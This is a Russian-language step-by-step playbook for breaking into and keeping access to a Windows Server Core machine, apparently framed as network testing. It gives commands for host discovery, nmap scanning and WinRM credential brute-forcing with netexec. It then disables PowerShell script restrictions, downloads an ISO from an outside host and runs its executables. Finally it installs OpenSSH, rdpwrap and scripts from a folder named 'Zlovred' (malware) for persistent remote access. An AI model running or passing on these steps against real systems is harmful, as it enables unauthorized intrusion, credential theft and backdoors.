# Windows Server Core Инструкция по закреплению

## Алгоритм

### 1\. Определение учётных данных и подключение к серверу как администратор

Вначале нужно определиться со следующими значениями:

- «Серый» IP адрес устройства;
- Его mDNS/NetBIOS имя.

Здесь существует несколько путей.

**Первй способ**:

- Войти в командную строку (CLI) интерфейса Keenetic.
- Подать команду:

```bash
show ip dhcp bindings _WEBADMIN
```
- Найти IP адрес и имя устройства в выводе.

**Второй способ**

- Войти в командную строку (CLI) тестового Linux компьютера в тестируемой локальной сети;
- Подать команду:

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

где `eth0` — сетевой интерфейс, `192.168.1.0/24` — сетевой диапазон адресов локальной сети (определяется из бокового перемещения cli).

- Программа выдаст статистику по подключённым устройствам. После сбора достаточной статистики нажмите `Ctrl+C`, чтобы выйти из программы.

**Последующие действия**

После этих двух способов Вам будет необходимо провести анализ данных, чтобы найти нужный сервер. Необходимо проверять имя хоста (вдруг там будет подстрока *Server*), поле *expires:* в способе 1 (возможно, найдёте какую-то аномалию). Свои догадки вы можете проверить командой:

```bash
nmap -Pn -p 21,22,23,80,135,139,443,445,3389,5985 $IPAddr
```

где переменная $IPAddr содержит IPv4 адрес вашего тестируемого устройства. Эта команда выдаст достаточную информацию об устройстве, чтобы опеределить, на какой операционной системе работает устройство, целесообразно ли проникать на него и, главное, открыт ли на нём порт WinRM для осуществления дальнейшей атаки.

Если вы успешно определили атакуемую машину и проверили наличие на ней нужных портов, можете осуществить брутфорс её администраторской записи командой:

```bash
sudo netexec winrm -u /home/vagrant/Dictionaries/users-my.txt -p /home/vagrant/Dictionaries/passwords-my.txt --continue-on-succes $IPAddr | grep -i 'Pwn3d!' | tee /home/vagrant/Output/cred-netexec-$(date +"%y-%m-%d_%H-%M-%S")_$IPAddr.txt
```
где `/home/vagrant/Dictionaries/users-my.txt` — путь к файлу со списком логинов, `/home/vagrant/Dictionaries/passwords-my.txt` — путь к файлу со списком паролей, `/home/vagrant/Output/cred-netexec-$(date +"%y-%m-%d_%H-%M-%S")_$IPAddr.txt — каталог сохранения найденных учётных записей.

После этого переходите на Windows машину, задайте переменную *$cred0* с найденными учётными записями, переменные *$IPADDr* с IPv4 адресом и *$ComputerName* с хост-именем компьютераб и откройте сессию WinRM командой:

```powershell
$sess0=New-PSSession -ComputerName $ComputerName -Credential $cred0 -Authentication Negotiate -Port 5985
```

### 2\. Загрузка образа *NIT-SomePSGUI.iso* 

- Войдите в сессию на Winndows Server командой:

```powershell
Enter-PSSession -Session $sess0
```
- Разблокируйте запуск Powershell скриптов командой:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
```

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

- Загрузите образ диска командой:

```powershell
$wc = New-Object System.Net.WebClient;$wc.DownloadFile("http://win.netip4.ru/win10plusupdate/misc/ISO/DownloadFile.ashx?file=NIT-SomePSGUI.iso", "c:\Users\Администратор\Downloads\NIT-SomePSGUI.iso");Unblock-File -Path "c:\Users\Администратор\Downloads\NIT-SomePSGUI.iso"
```

Далее перейдите в каталог командой:

```powercshell
cd ..\Downloads
```

и проверьте правильность загрузки файла командой:

```powershell
gci .
```
#### 3\. Монтирование образа и запуск установки

- Смонтируйте загруженный образ командой:

```powershell
Mount-DiskImage -ImagePath "c:\Users\Администратор\Downloads\NIT-SomePSGUI.iso" | Get-Volume
```

Эта команда смонтирует образ диска и выдаст информацию о смонтированной файловой системе, в том числе и буквы диска. Буква диска будет показана в поле `DriveLetter`. Запомните её.

- Запустите команду проверки существования исполняемых файлов:

```powershell
gci e:\2\
```

где *e:* — буква диска из предыдущего пункта.

- Запустите команду на выполнение:

```powershell
& e:\2\NIT-SomePSGUI.001.exe
```

- Далее подайте команду:

```powershell
Get-Process | Where-Object {$_.Company -NotMatch "Microsoft"} | Select-Object -Property Name,Id,Company,Product,Path | Format-Table -AutoSize
```

чтобы посмотреть, не выполняются ли на компьютере сторонние процессы установки.

- Перезагрузите компьютер командой:

```powershell
Restart-Computer -Force
```

- Повторите те же самые действия для `NIT-SomePSGUI.002.exe` и `NIT-SomePSGUI.003.exe` команд

- Для подачи команды *NIT-SomePSGUI.004.exe* действия немного отличаются. Необходимо войти в систему от имени обычного пользователя с  правами локального администратора. Например, *MSSQLSR*, который был создан на предыдущем этапе. Далее действия  `NIT-SomePSGUI.004.exe` и `NIT-SomePSGUI.005.exe` не отличаются.

### 4\. Установка дополнительных пакетов

- Залогинтесь в систему от имени локального администратора (в интерфейс CLI).

- Далее, в командной строке, необходимо установить ещё несколько пакетов:

```powershell
cd C:\pub1\Distrib\Zlovred\win-msf\msf\app\ps1\
```

```powershell
& .\nit.install-openssh64.bat
```

```powershell
& .\nit.install-rdpwrap.bat
```

```powershell
& .\NIT-CerediraTess.Install.ps1
```

```powershell
& C:\Util\install.CerediraTess-NIT.util.cmd
```

- После перезагрузки сервера можете входить на сервер командой:

```powershell
mstsc /v:$IPAddr /admin
```
с актуальными учётными данными.

